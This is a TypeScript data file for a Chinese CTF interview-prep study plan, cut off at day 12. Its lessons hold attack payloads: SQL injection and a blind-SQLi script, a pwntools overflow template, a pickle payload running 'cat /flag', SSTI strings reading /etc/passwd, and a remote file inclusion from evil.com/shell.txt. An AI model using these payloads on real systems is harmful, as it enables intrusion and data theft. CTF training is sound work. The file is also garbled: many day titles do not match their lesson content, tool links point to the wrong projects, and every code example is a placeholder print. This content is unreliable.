// 面试突击 — CTF竞赛：26天全量复习 + 19天面试实战 = 45天
import { type CyberDay, type CyberLearningPlan, type QuizQuestion } from './cyberBasic';

const q = (question: string, opts: string[], ans: number, exp: string): QuizQuestion => ({ question, options: opts, correctIndex: ans, explanation: exp });

function mergeEvenly(days: CyberDay[], target: number): CyberDay[] {
  const n = days.length;
  const result: CyberDay[] = [];
  const groupSize = n / target;
  for (let g = 0; g < target; g++) {
    const start = Math.round(g * groupSize);
    const end = Math.round((g + 1) * groupSize);
    const chunk = days.slice(start, end);
    if (chunk.length === 0) continue;
    const first = chunk[0];
    const last = chunk[chunk.length - 1];
    result.push({
      id: `interview-ctf-review-${g + 1}`,
      day: g + 1,
      title: `复习 Day ${g + 1}: ${first.title}`,
      subtitle: chunk.length > 1 ? `速览 Day${first.day}-Day${last.day}（${chunk.length}天合一）` : `原版 Day${first.day}`,
      objectives: [...new Set(chunk.flatMap(d => d.objectives || []))],
      content: chunk.map(d => `## ${d.title}\n\n${d.content || ''}`).join('\n\n---\n\n'),
      keyPoints: [...new Set(chunk.flatMap(d => d.keyPoints || []))] as string[],
      quiz: chunk.flatMap(d => d.quiz || []),
      codeExamples: chunk.flatMap(d => d.codeExamples || []),
      resources: chunk.flatMap(d => d.resources || []),
      labEnvironment: chunk.flatMap(d => d.labEnvironment || []),
      expertNotes: chunk.flatMap(d => d.expertNotes || []),
    } as CyberDay);
  }
  return result;
}

const ctfReviewDays: CyberDay[] = [
  {
    id: 'ctf-r1', day: 1, title: 'F12网络面板深度拆解',
    subtitle: '浏览器F12·HTTP请求头分析',
    objectives: ['了解CTF竞赛类型和规则'],
    keyPoints: ['CTF类型','平台','竞赛规则','备赛策略'],
    content: '# CTF竞赛入门\n\n**CTF是什么？**\nCapture The Flag，网络安全夺旗赛。参赛队伍通过解题获取flag得分。\n\n**CTF类型：**\n- Jeopardy：答题型，解不同题目拿分\n- Attack-Defense：攻防型，攻击对手+防御自己\n- Mix：混合模式\n\n**常见CTF平台：**\n- 国内：CTFHub、BUUCTF、攻防世界\n- 国际：HackTheBox、TryHackMe、CTFtime\n\n**竞赛规则：**\n- 题分不同题型：Web、PWN、Crypto、Reverse、Misc\n- 难度递增，分值递增\n- 解题后提交flag格式：flag{xxx}',
    quiz: [q('CTF竞赛中Jeopardy类型是什么意思？',['攻防对抗','答题解题','混合模式','团队协作'],1,'Jeopardy是答题型CTF，解不同题目拿分'),q('CTF中常见的flag格式是什么？',['flag{xxx}','FLAG{xxx}','{flag}xxx','xxx(flag)'],0,'标准flag格式为flag{xxx}')],
    codeExamples: [{ title: 'F12网络面板深度拆解示例代码', language: 'python', code: '# F12网络面板深度拆解 - Day 1\n# CTF web方向实战\nprint("CTF web实战")', explanation: 'F12网络面板深度拆解核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: 'F12网络面板深度拆解核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: 'F12网络面板深度拆解辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: 'F12网络面板深度拆解常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'F12网络面板深度拆解实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择F12网络面板深度拆解相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握F12网络面板深度拆解的基本解题方法' }],
    resources: [
      { name: 'F12网络面板深度拆解学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'F12网络面板深度拆解实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'F12网络面板深度拆解专家', title: 'F12网络面板深度拆解学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'ctf-r2', day: 2, title: 'GET与POST手搓战',
    subtitle: 'F12 Fetch·GET/POST切换',
    objectives: ['掌握Web基础题解题思路'],
    keyPoints: ['SQL注入','XSS','文件上传','SSRF','代码审计'],
    content: '# CTF Web题目基础\n\n**常见Web题型：**\n\n1. **SQL注入**\n```\n?id=1 ORDER BY 3--\n?id=-1 UNION SELECT 1,2,3--\n?id=-1 UNION SELECT 1,database(),3--\n```\n\n2. **文件上传**\n- 绕过前端校验\n- 修改Content-Type\n- 双扩展名(.php5)\n- 图片马\n\n3. **SSRF**\n- 打内网服务(127.0.0.1)\n- gopher协议打Redis\n- dict协议探测端口\n\n4. **命令执行**\n- 无空格绕过($IFS)\n- 编码绕过(base64)\n- 管道符(| ; &&)',
    quiz: [q('SQL注入中UNION SELECT的作用是什么？',['删除数据','联合查询获取数据','更新数据','插入数据'],1,'UNION SELECT用于联合查询，可以获取数据库中的数据'),q('文件上传漏洞中，图片马是什么？',['图片格式的木马文件','用图片编写的程序','图片加密工具','图片压缩工具'],0,'图片马是将恶意代码隐藏在图片中的木马文件')],
    codeExamples: [{ title: 'GET与POST手搓战示例代码', language: 'python', code: '# GET与POST手搓战 - Day 2\n# CTF web方向实战\nprint("CTF web实战")', explanation: 'GET与POST手搓战核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: 'GET与POST手搓战核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: 'GET与POST手搓战辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: 'GET与POST手搓战常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'GET与POST手搓战实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择GET与POST手搓战相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握GET与POST手搓战的基本解题方法' }],
    resources: [
      { name: 'GET与POST手搓战学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'GET与POST手搓战实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'GET与POST手搓战专家', title: 'GET与POST手搓战学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'ctf-r3', day: 3, title: 'Cookie越权',
    subtitle: 'Cookie修改·权限提升',
    objectives: ['理解PWN基础概念'],
    keyPoints: ['栈溢出','格式化字符串','ROP','堆漏洞'],
    content: '# CTF PWN入门\n\n**PWN是什么？**\n二进制漏洞利用，通过漏洞获取shell或提权。\n\n**基础工具：**\n- pwntools：Python写exp\n- GDB：调试\n- IDA Pro/Ghidra：反汇编\n- checksec：检查保护机制\n\n**常见漏洞：**\n\n1. **栈溢出**\n```python\nfrom pwn import *\np = remote(ip, port)\npayload = b\'A\'*0x40 + p64(0xdeadbeef)\np.sendline(payload)\np.interactive()\n```\n\n2. **格式化字符串**\n```\nprintf("%p%p%p") 泄露栈地址\nprintf("%n") 写内存\n```\n\n3. **保护机制**\n- ASLR：地址随机化\n- Canary：栈保护\n- PIE：程序基址随机化\n- NX：数据段不可执行',
    quiz: [q('栈溢出漏洞的本质是什么？',['缓冲区溢出覆盖返回地址','堆内存损坏','格式化字符串漏洞','整数溢出'],0,'栈溢出是缓冲区溢出覆盖返回地址，跳转到恶意代码'),q('NX保护的作用是什么？',['地址随机化','栈保护','数据段不可执行','程序基址随机化'],2,'NX保护使数据段不可执行，防止shellcode执行')],
    codeExamples: [{ title: 'Cookie越权示例代码', language: 'python', code: '# Cookie越权 - Day 3\n# CTF web方向实战\nprint("CTF web实战")', explanation: 'Cookie越权核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: 'Cookie越权核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: 'Cookie越权辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: 'Cookie越权常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'Cookie越权实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择Cookie越权相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握Cookie越权的基本解题方法' }],
    resources: [
      { name: 'Cookie越权学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'Cookie越权实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'Cookie越权专家', title: 'Cookie越权学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'ctf-r4', day: 4, title: '状态码与跳转',
    subtitle: 'HTTP Status Code·302重定向',
    objectives: ['掌握密码学基础题型'],
    keyPoints: ['古典密码','现代密码','RSA','AES','哈希'],
    content: '# CTF Crypto入门\n\n**常见Crypto题型：**\n\n1. **古典密码**\n- 凯撒密码(位移)\n- 维吉尼亚密码(多表替换)\n- 栅栏密码(行列变换)\n- 摩尔斯电码\n\n2. **现代密码**\n- RSA：分解大因数、小指数攻击、共模攻击\n- AES：ECB模式攻击、CBC模式IV攻击\n- 哈希：碰撞攻击、长度扩展攻击\n\n3. **工具**\n- openssl：加密解密\n- hashcat/john：哈希破解\n- RsaCtfTool：RSA攻击工具\n\n**RSA解题示例：**\n```python\nfrom Crypto.Util.number import *\nn = ...\ne = ...\nc = ...\np = factor(n)[0]\nq = n // p\nphi = (p-1)*(q-1)\nd = inverse(e, phi)\nm = pow(c, d, n)\nprint(long_to_bytes(m))\n```',
    quiz: [q('RSA加密中，私钥d是如何计算的？',['d = e * phi(n)','d = e^(-1) mod phi(n)','d = n * e','d = p * q'],1,'私钥d是e在模phi(n)下的乘法逆元'),q('凯撒密码是什么类型的密码？',['多表替换密码','单表替换密码','对称加密','非对称加密'],1,'凯撒密码是最简单的单表替换密码')],
    codeExamples: [{ title: '状态码与跳转示例代码', language: 'python', code: '# 状态码与跳转 - Day 4\n# CTF web方向实战\nprint("CTF web实战")', explanation: '状态码与跳转核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: '状态码与跳转核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: '状态码与跳转辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: '状态码与跳转常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '状态码与跳转实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择状态码与跳转相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握状态码与跳转的基本解题方法' }],
    resources: [
      { name: '状态码与跳转学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '状态码与跳转实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '状态码与跳转专家', title: '状态码与跳转学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'ctf-r5', day: 5, title: 'UA伪装与Referer防盗链',
    subtitle: 'User-Agent·Referer伪造',
    objectives: ['掌握逆向基础'],
    keyPoints: ['静态分析','动态调试','反混淆','反编译'],
    content: '# CTF Reverse入门\n\n**Reverse是什么？**\n逆向工程，分析二进制程序获取flag。\n\n**工具：**\n- IDA Pro/Ghidra：静态分析\n- x64dbg/x32dbg：动态调试\n- OllyDbg：经典调试器\n\n**常见技巧：**\n\n1. **字符串搜索**\n- 在IDA中搜索"flag"、"password"等关键词\n\n2. **反混淆**\n- 去除花指令\n- 还原控制流\n- 消除字符串加密\n\n3. **动态调试**\n- 设置断点\n- 追踪执行流程\n- 观察寄存器和内存\n\n4. **脚本辅助**\n- IDA脚本批量分析\n- Frida动态插桩',
    quiz: [q('逆向工程中IDA Pro主要用于什么？',['动态调试','静态分析','编写漏洞利用','加密解密'],1,'IDA Pro是最常用的静态分析工具'),q('Frida是什么工具？',['反汇编器','动态插桩工具','调试器','加密工具'],1,'Frida是一款强大的动态插桩工具')],
    codeExamples: [{ title: 'UA伪装与Referer防盗链示例代码', language: 'python', code: '# UA伪装与Referer防盗链 - Day 5\n# CTF web方向实战\nprint("CTF web实战")', explanation: 'UA伪装与Referer防盗链核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: 'UA伪装与Referer防盗链核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: 'UA伪装与Referer防盗链辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: 'UA伪装与Referer防盗链常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'UA伪装与Referer防盗链实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择UA伪装与Referer防盗链相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握UA伪装与Referer防盗链的基本解题方法' }],
    resources: [
      { name: 'UA伪装与Referer防盗链学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'UA伪装与Referer防盗链实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'UA伪装与Referer防盗链专家', title: 'UA伪装与Referer防盗链学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'ctf-r6', day: 6, title: 'CTFHub HTTP协议模块清关',
    subtitle: 'HTTP协议全模块·综合训练',
    objectives: ['掌握杂项题型'],
    keyPoints: ['隐写术','流量分析','编码','取证'],
    content: '# CTF Misc入门\n\n**Misc是什么？**\n杂项题目，包括隐写术、流量分析、编码解码等。\n\n**常见题型：**\n\n1. **隐写术**\n- 图片隐写：LSB、Steghide、Exif\n- 音频隐写：频谱分析、声谱图\n- 文件隐写：压缩包密码、文件头修复\n\n2. **流量分析**\n- Wireshark分析PCAP\n- HTTP明文传输\n- TLS证书信息\n- DNS隐藏数据\n\n3. **编码解码**\n- Base64/Base32/Base58\n- URL编码、HTML实体编码\n- Unicode编码\n- 进制转换\n\n4. **取证**\n- 文件恢复(testdisk/photorec)\n- 内存取证(volatility)\n- 注册表分析',
    quiz: [q('LSB隐写术是什么？',['在图片最低有效位隐藏数据','加密图片数据','压缩图片','修复图片'],0,'LSB隐写术是在图片像素的最低有效位中隐藏数据'),q('分析PCAP流量文件常用什么工具？',['IDA Pro','Wireshark','GDB','pwntools'],1,'Wireshark是分析网络流量的专业工具')],
    codeExamples: [{ title: 'CTFHub HTTP协议模块清关示例代码', language: 'python', code: '# CTFHub HTTP协议模块清关 - Day 6\n# CTF web方向实战\nprint("CTF web实战")', explanation: 'CTFHub HTTP协议模块清关核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: 'CTFHub HTTP协议模块清关核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: 'CTFHub HTTP协议模块清关辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: 'CTFHub HTTP协议模块清关常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'CTFHub HTTP协议模块清关实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择CTFHub HTTP协议模块清关相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握CTFHub HTTP协议模块清关的基本解题方法' }],
    resources: [
      { name: 'CTFHub HTTP协议模块清关学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'CTFHub HTTP协议模块清关实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'CTFHub HTTP协议模块清关专家', title: 'CTFHub HTTP协议模块清关学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'ctf-r7', day: 7, title: '休息+预习',
    subtitle: 'Burp Suite初步认识',
    objectives: ['掌握CTF常用工具'],
    keyPoints: ['pwntools','IDA','GDB','Wireshark','hashcat'],
    content: '# CTF工具链\n\n**必备工具：**\n\n1. **pwntools**\n```python\nfrom pwn import *\np = remote(host, port)\np.send(payload)\np.recv()\np.interactive()\n```\n\n2. **GDB调试**\n```\ngdb ./binary\nb *0xdeadbeef\nrun\nni\nsix\ninfo registers\nx/20xw $esp\n```\n\n3. **Wireshark**\n- 过滤规则：http.request、tcp.port==80\n- 导出对象：File -> Export Objects\n- 追踪流：Follow -> TCP Stream\n\n4. **hashcat**\n```\nhashcat -m 0 hash.txt rockyou.txt\nhashcat -m 1000 hash.txt rockyou.txt\n```',
    quiz: [q('pwntools主要用于什么？',['静态分析','编写漏洞利用脚本','调试程序','加密解密'],1,'pwntools是用于编写漏洞利用脚本的Python库'),q('GDB中设置断点的命令是什么？',['run','b','ni','info'],1,'在GDB中使用b命令设置断点')],
    codeExamples: [{ title: '休息+预习示例代码', language: 'python', code: '# 休息+预习 - Day 7\n# CTF tools方向实战\nprint("CTF tools实战")', explanation: '休息+预习核心代码示例' }],
    recommendedTools: [
      { name: 'pwntools', description: '休息+预习核心工具', url: 'https://github.com', type: 'local' },
      { name: 'CyberChef', description: '休息+预习辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'Foremost', description: '休息+预习常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: '休息+预习实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择休息+预习相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握休息+预习的基本解题方法' }],
    resources: [
      { name: '休息+预习学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: '休息+预习实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: '休息+预习专家', title: '休息+预习学习建议', content: '工欲善其事必先利其器：1)建立自己的脚本模板库（SQL注入、栈溢出、编码转换）2)整理常用字典文件 3)配置好虚拟机并做快照 4)积累工具使用心得笔记。工具熟练程度直接决定解题速度。', url: '' }]
  },
  {
    id: 'ctf-r8', day: 8, title: 'Proxy抓包与CA证书',
    subtitle: 'Burp Proxy·HTTPS证书配置',
    objectives: ['了解主流CTF平台'],
    keyPoints: ['CTFHub','BUUCTF','HackTheBox','TryHackMe'],
    content: '# CTF刷题平台\n\n**国内平台：**\n\n1. **CTFHub**\n- 地址：https://www.ctfhub.com\n- 特点：分题型练习，适合新手\n\n2. **BUUCTF**\n- 地址：https://buuoj.cn\n- 特点：国内最大CTF平台，题目多\n\n3. **攻防世界**\n- 地址：https://adworld.xctf.org.cn\n- 特点：分新手区、进阶区、高手区\n\n**国际平台：**\n\n1. **HackTheBox**\n- 地址：https://www.hackthebox.com\n- 特点：靶机实战，模拟真实渗透\n\n2. **TryHackMe**\n- 地址：https://tryhackme.com\n- 特点：新手友好，有学习路径\n\n3. **CTFtime**\n- 地址：https://ctftime.org\n- 特点：赛事日历，查看国内外竞赛',
    quiz: [q('国内最大的CTF平台是哪个？',['CTFHub','BUUCTF','攻防世界','HackTheBox'],1,'BUUCTF是国内最大的CTF平台'),q('HackTheBox的特点是什么？',['分题型练习','靶机实战模拟渗透','新手友好','赛事日历'],1,'HackTheBox提供靶机实战，模拟真实渗透环境')],
    codeExamples: [{ title: 'Proxy抓包与CA证书示例代码', language: 'python', code: '# Proxy抓包与CA证书 - Day 8\n# CTF tools方向实战\nprint("CTF tools实战")', explanation: 'Proxy抓包与CA证书核心代码示例' }],
    recommendedTools: [
      { name: 'pwntools', description: 'Proxy抓包与CA证书核心工具', url: 'https://github.com', type: 'local' },
      { name: 'CyberChef', description: 'Proxy抓包与CA证书辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'Foremost', description: 'Proxy抓包与CA证书常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'Proxy抓包与CA证书实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择Proxy抓包与CA证书相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握Proxy抓包与CA证书的基本解题方法' }],
    resources: [
      { name: 'Proxy抓包与CA证书学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'Proxy抓包与CA证书实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'Proxy抓包与CA证书专家', title: 'Proxy抓包与CA证书学习建议', content: '工欲善其事必先利其器：1)建立自己的脚本模板库（SQL注入、栈溢出、编码转换）2)整理常用字典文件 3)配置好虚拟机并做快照 4)积累工具使用心得笔记。工具熟练程度直接决定解题速度。', url: '' }]
  },
  {
    id: 'ctf-r9', day: 9, title: 'Repeater核心操作',
    subtitle: 'Burp Repeater·请求重放',
    objectives: ['理解团队协作模式'],
    keyPoints: ['分工','工具','沟通','心态'],
    content: '# CTF团队协作\n\n**团队分工：**\n\n| 角色 | 职责 | 技能要求 |\n|------|------|----------|\n| Web手 | Web题目解题 | SQL注入、XSS、文件上传 |\n| PWN手 | 二进制漏洞 | 栈溢出、ROP、堆漏洞 |\n| Crypto手 | 密码学题目 | RSA、AES、古典密码 |\n| Reverse手 | 逆向工程 | IDA、调试器、反混淆 |\n| Misc手 | 杂项题目 | 隐写、流量分析、编码 |\n\n**协作工具：**\n- Discord/Slack：即时沟通\n- CTFd：平台协作\n- 共享文档：记录解题思路\n- VPN：内网协作',
    quiz: [q('CTF团队中负责Web题目的角色叫什么？',['PWN手','Web手','Crypto手','Reverse手'],1,'负责Web题目的角色称为Web手'),q('CTF团队常用的即时沟通工具是什么？',['Notion','Discord','HackMD','VPN'],1,'Discord是CTF团队常用的即时沟通工具')],
    codeExamples: [{ title: 'Repeater核心操作示例代码', language: 'python', code: '# Repeater核心操作 - Day 9\n# CTF tools方向实战\nprint("CTF tools实战")', explanation: 'Repeater核心操作核心代码示例' }],
    recommendedTools: [
      { name: 'pwntools', description: 'Repeater核心操作核心工具', url: 'https://github.com', type: 'local' },
      { name: 'CyberChef', description: 'Repeater核心操作辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'Foremost', description: 'Repeater核心操作常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'Repeater核心操作实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择Repeater核心操作相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握Repeater核心操作的基本解题方法' }],
    resources: [
      { name: 'Repeater核心操作学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'Repeater核心操作实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'Repeater核心操作专家', title: 'Repeater核心操作学习建议', content: '工欲善其事必先利其器：1)建立自己的脚本模板库（SQL注入、栈溢出、编码转换）2)整理常用字典文件 3)配置好虚拟机并做快照 4)积累工具使用心得笔记。工具熟练程度直接决定解题速度。', url: '' }]
  },
  {
    id: 'ctf-r10', day: 10, title: 'Decoder解码器三板斧',
    subtitle: 'Burp Decoder·编码解码',
    objectives: ['掌握进阶解题技巧'],
    keyPoints: ['自动化脚本','脚本模板','快速解题'],
    content: '# CTF进阶技巧\n\n**自动化脚本：**\n\n1. **SQL注入自动化**\n```python\nimport requests\ndef blind_sqli(url):\n    flag = \'\'\n    for i in range(1, 50):\n        for c in \'abcdefghijklmnopqrstuvwxyz0123456789{}\':\n            payload = f"\' AND SUBSTRING((SELECT flag),{i},1)=\'{c}--"\n            r = requests.get(url + payload)\n            if \'success\' in r.text:\n                flag += c\n                print(flag)\n                break\n    return flag\n```\n\n2. **端口扫描**\n```python\nimport socket\nfor port in range(1, 65536):\n    sock = socket.socket()\n    sock.settimeout(0.5)\n    if sock.connect_ex((\'127.0.0.1\', port)) == 0:\n        print(f"Open: {port}")\n    sock.close()\n```\n\n**脚本模板：**\n- pwntools模板\n- SQL注入模板\n- SSRF探测模板\n- 编码解码模板',
    quiz: [q('自动化脚本在CTF中的作用是什么？',['美化界面','提高解题效率','加密数据','编写文档'],1,'自动化脚本可以显著提高解题效率'),q('SQL盲注通常使用什么方法获取数据？',['直接读取数据库','逐字符猜测','暴力破解','字典攻击'],1,'SQL盲注通常使用逐字符猜测的方法')],
    codeExamples: [{ title: 'Decoder解码器三板斧示例代码', language: 'python', code: '# Decoder解码器三板斧 - Day 10\n# CTF tools方向实战\nprint("CTF tools实战")', explanation: 'Decoder解码器三板斧核心代码示例' }],
    recommendedTools: [
      { name: 'pwntools', description: 'Decoder解码器三板斧核心工具', url: 'https://github.com', type: 'local' },
      { name: 'CyberChef', description: 'Decoder解码器三板斧辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'Foremost', description: 'Decoder解码器三板斧常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'Decoder解码器三板斧实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择Decoder解码器三板斧相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握Decoder解码器三板斧的基本解题方法' }],
    resources: [
      { name: 'Decoder解码器三板斧学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'Decoder解码器三板斧实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'Decoder解码器三板斧专家', title: 'Decoder解码器三板斧学习建议', content: '工欲善其事必先利其器：1)建立自己的脚本模板库（SQL注入、栈溢出、编码转换）2)整理常用字典文件 3)配置好虚拟机并做快照 4)积累工具使用心得笔记。工具熟练程度直接决定解题速度。', url: '' }]
  },
  {
    id: 'ctf-r11', day: 11, title: 'Intruder爆破器',
    subtitle: 'Burp Intruder·Sniper模式',
    objectives: ['掌握Web高级题目'],
    keyPoints: ['反序列化','SSTI','XSS进阶','CSRF','文件包含'],
    content: '# CTF Web高级技巧\n\n**1. 反序列化**\n\nPHP：\n```php\n__wakeup() -> __destruct() -> __call()\nphar://xxx.phar\n```\n\nPython：\n```python\nimport pickle\npickle.loads(b\'cos\\nsystem\\n(S"cat /flag"\\ntR.\')\n```\n\n**2. SSTI**\n\nJinja2：\n```\n{{config}}\n{{\'\'.__class__.__mro__[2].__subclasses__()}}\n{{\'\'.__class__.__mro__[2].__subclasses__()[40](\'/etc/passwd\').read()}}\n```\n\n**3. XSS进阶**\n- DOM XSS\n- 存储型XSS\n- 反射型XSS\n- 绕过CSP\n\n**4. 文件包含**\n- LFI：../../etc/passwd\n- RFI：http://evil.com/shell.txt\n- php://filter/convert.base64-encode/resource=xxx',
    quiz: [q('PHP反序列化漏洞中常用的魔术方法是什么？',['__init__','__wakeup','__main__','__start__'],1,'__wakeup是PHP反序列化中常用的魔术方法'),q('SSTI是什么漏洞？',['SQL注入','服务器端模板注入','跨站脚本','文件包含'],1,'SSTI是服务器端模板注入漏洞')],
    codeExamples: [{ title: 'Intruder爆破器示例代码', language: 'python', code: '# Intruder爆破器 - Day 11\n# CTF web方向实战\nprint("CTF web实战")', explanation: 'Intruder爆破器核心代码示例' }],
    recommendedTools: [
      { name: 'Burp Suite', description: 'Intruder爆破器核心工具', url: 'https://github.com', type: 'local' },
      { name: 'sqlmap', description: 'Intruder爆破器辅助工具', url: 'https://gchq.github.io/CyberChef', type: 'browser' },
      { name: 'dirsearch', description: 'Intruder爆破器常用工具', url: 'https://github.com/Gallopsled/pwntools', type: 'local' }
    ],
    labEnvironment: [{ name: 'Intruder爆破器实战练习', description: '在CTF平台上练习相关题目', url: 'https://www.ctfhub.com', type: 'online', setup: '1. 进入CTFHub或攻防世界 2. 选择Intruder爆破器相关题目 3. 独立完成至少2道 4. 记录解题思路', expectedOutput: '掌握Intruder爆破器的基本解题方法' }],
    resources: [
      { name: 'Intruder爆破器学习指南', url: 'https://ctf-wiki.org', type: 'article' },
      { name: 'Intruder爆破器实战技巧', url: 'https://www.freebuf.com', type: 'article' }
    ],
    expertNotes: [{ author: 'Intruder爆破器专家', title: 'Intruder爆破器学习建议', content: 'Web方向是CTF中题目最多的方向，核心能力：1)快速识别漏洞类型 2)掌握各类绕过技巧 3)熟练使用Burp Suite 4)能写自动化脚本。建议从SQL注入和XSS开始系统学习。', url: '' }]
  },
  {
    id: 'ctf-r12', day: 12, title: 'Burp组合拳训练',
    subtitle: '抓包改Cookie重放',
    objectives: ['掌握PWN高级题目'],
    keyPoints: ['ROP链','堆漏洞','格式化字符串','Shellcode'],
